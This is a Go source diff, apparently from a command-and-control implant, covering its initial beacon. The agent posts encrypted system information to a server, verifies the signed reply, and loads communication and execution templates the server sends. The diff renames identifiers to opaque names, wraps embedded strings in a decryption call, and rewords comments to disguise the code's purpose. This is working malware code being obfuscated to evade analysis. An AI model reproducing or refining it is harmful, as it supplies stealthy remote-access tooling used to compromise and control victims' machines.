@@ -23,16 +23,16 @@ import (
 
 // HTTP strings are injected via ldflags (XOR encrypted) and decrypted at startup in getEnv.go
 // Variables defined in main.go: httpHeaderUserAgent, httpHeaderContentType, httpHeaderPadPre,
-// httpHeaderPadApp, httpMetaId, httpMetaEncryption, httpEncRsaAes
+// httpHeaderPadApp, httpMetaId, httpMetaEncryption, httpEncRsaAes (encrypted at rest, use secVal())
 
 // placeInLocation places data in the specified HTTP location
 // output format: "body", "header:<name>", "cookie:<name>", "query:<name>", "uri_append"
-// prependLen and appendLen are NOT set here - X-Pad headers are only for POST body data
+// prependLen and appendLen are NOT set here - cache headers are only for POST body data
 // For non-body locations (header/cookie/query), the server uses transform.Length directly
 func placeInLocation(req *http.Request, output string, data []byte, prependLen, appendLen int) {
 	locType, name := parseOutput(output)
 
-	// NOTE: We don't set X-Pad headers here. Those are only for POST body data.
+	// NOTE: We don't set cache headers here. Those are only for POST body data.
 	// For clientID and other non-body data, the server uses the transform's Length
 	// field directly for reversal (which is already in the config).
 
@@ -55,7 +55,7 @@ func placeInLocation(req *http.Request, output string, data []byte, prependLen, 
 
 // buildRequestWithTransforms creates an HTTP request with transformed clientID placed correctly
 // Returns the request and body data (if output is "body")
-func buildRequestWithTransforms(method, baseURL string, clientIDDataBlock *DataBlock, clientIDVal string, decrypted *DecryptedConfig) (*http.Request, []byte, error) {
+func buildRequestWithTransforms(method, baseURL string, clientIDDataBlock *DataBlock, clientIDVal string, decrypted *ResolvedConfig) (*http.Request, []byte, error) {
 	req, err := http.NewRequest(method, baseURL, nil)
 	if err != nil {
 		return nil, nil, fmt.Errorf(ErrCtx(E12, err.Error()))
@@ -75,10 +75,10 @@ func buildRequestWithTransforms(method, baseURL string, clientIDDataBlock *DataB
 			bodyData = result.Data
 			// Still set padding headers
 			if result.PrependLength > 0 {
-				req.Header.Set(httpHeaderPadPre, fmt.Sprintf("%d", result.PrependLength))
+				req.Header.Set(secVal(httpHeaderPadPre), fmt.Sprintf("%d", result.PrependLength))
 			}
 			if result.AppendLength > 0 {
-				req.Header.Set(httpHeaderPadApp, fmt.Sprintf("%d", result.AppendLength))
+				req.Header.Set(secVal(httpHeaderPadApp), fmt.Sprintf("%d", result.AppendLength))
 			}
 		} else {
 			placeInLocation(req, clientIDDataBlock.Output, result.Data, result.PrependLength, result.AppendLength)
@@ -96,21 +96,21 @@ func buildRequestWithTransforms(method, baseURL string, clientIDDataBlock *DataB
 	return req, bodyData, nil
 }
 
-// PostData represents the structure of our post request body
-type PostData struct {
+// PostBlk represents the structure of our post request body
+type PostBlk struct {
 	Data      string            `json:"data"`      // Our encrypted system info
 	Metadata  map[string]string `json:"md"`  // Additional metadata
 	Timestamp int64             `json:"ts"` // Current timestamp
 }
 
-type SignedResponse struct {
+type VResp struct {
 	Status             string `json:"st"`
-	NewClientID        string `json:"nc"`
-	SecretsInitialized bool   `json:"si"`
+	NNID        string `json:"nc"`
+	SInit bool   `json:"si"`
 	Signature          string `json:"sg"`
 	Seed               string `json:"seed"`
-	CommsTemplate      string `json:"ct,omitempty"` // Base64-encoded comms template
-	ExecReqTemplate    string `json:"et,omitempty"` // Base64-encoded exec requirements template
+	PCfg      string `json:"ct,omitempty"` // Base64-encoded comms template
+	RunCfg    string `json:"et,omitempty"` // Base64-encoded exec requirements template
 }
 
 // parseCustomHeaders converts the JSON string of custom headers into a map
@@ -123,17 +123,17 @@ func parseCustomHeaders(headerJSON string) (map[string]string, error) {
 	return headers, nil
 }
 
-func sendInitialPost(url string, encryptedData string, decrypted *DecryptedConfig) (string, error) {
+func sendInitialPost(url string, encryptedData string, decrypted *ResolvedConfig) (string, error) {
 	method := decrypted.PostMethod
 	if method == "" {
-		method = geMethodPost
+		method = secVal(geMethodPost)
 	}
 
-	postData := PostData{
+	postData := PostBlk{
 		Data: encryptedData,
 		Metadata: map[string]string{
-			httpMetaId:         clientID,
-			httpMetaEncryption: httpEncRsaAes,
+			secVal(httpMetaId):         clientID,
+			secVal(httpMetaEncryption): secVal(httpEncRsaAes),
 		},
 		Timestamp: time.Now().Unix(),
 	}
@@ -153,8 +153,8 @@ func sendInitialPost(url string, encryptedData string, decrypted *DecryptedConfi
 		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
 	}
 
-	req.Header.Set(httpHeaderUserAgent, decrypted.UserAgent)
-	req.Header.Set(httpHeaderContentType, decrypted.ContentType)
+	req.Header.Set(secVal(httpHeaderUserAgent), decrypted.UserAgent)
+	req.Header.Set(secVal(httpHeaderContentType), decrypted.ContentType)
 	for key, value := range customHeaders {
 		req.Header.Set(key, value)
 	}
@@ -173,12 +173,12 @@ func sendInitialPost(url string, encryptedData string, decrypted *DecryptedConfi
 		return "", fmt.Errorf(ErrCtx(E10, err.Error()))
 	}
 
-	var signedResponse SignedResponse
+	var signedResponse VResp
 	if err := json.Unmarshal(bodyBytes, &signedResponse); err != nil {
 		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
 	}
 
-	verificationData := fmt.Sprintf("%s:%s", signedResponse.NewClientID, signedResponse.Seed)
+	verificationData := fmt.Sprintf("%s:%s", signedResponse.NNID, signedResponse.Seed)
 	hashed := sha256.Sum256([]byte(verificationData))
 
 	// Parse server's public key
@@ -201,18 +201,18 @@ func sendInitialPost(url string, encryptedData string, decrypted *DecryptedConfi
 		return "", fmt.Errorf(ErrCtx(E3, err.Error()))
 	}
 
-	if signedResponse.NewClientID == "" {
+	if signedResponse.NNID == "" {
 		return "", fmt.Errorf(Err(E18))
 	}
 
 	// Parse and store comms template if provided
-	if signedResponse.CommsTemplate != "" {
-		if tplData, err := base64.StdEncoding.DecodeString(signedResponse.CommsTemplate); err == nil {
-			var ct CommsTemplate
+	if signedResponse.PCfg != "" {
+		if tplData, err := base64.StdEncoding.DecodeString(signedResponse.PCfg); err == nil {
+			var ct PCfg
 			if err := json.Unmarshal(tplData, &ct); err == nil {
-				// Zero old template before replacing
+				// zero old template before replacing
 				if globalCommsTpl != nil {
-					globalCommsTpl.Zero()
+					globalCommsTpl.zero()
 				}
 				globalCommsTpl = NewSecureTemplateFromSlices(ct.Version, ct.Type, ct.Templates, ct.Params)
 			}
@@ -220,14 +220,14 @@ func sendInitialPost(url string, encryptedData string, decrypted *DecryptedConfi
 	}
 
 	// Parse and store exec requirements template if provided
-	if signedResponse.ExecReqTemplate != "" {
-		if tplData, err := base64.StdEncoding.DecodeString(signedResponse.ExecReqTemplate); err == nil {
-			var et ExecReqTemplate
+	if signedResponse.RunCfg != "" {
+		if tplData, err := base64.StdEncoding.DecodeString(signedResponse.RunCfg); err == nil {
+			var et RunCfg
 			if err := json.Unmarshal(tplData, &et); err == nil {
 				setExecReqTemplate(&et)
 			}
 		}
 	}
 
-	return signedResponse.NewClientID, nil
+	return signedResponse.NNID, nil
 }
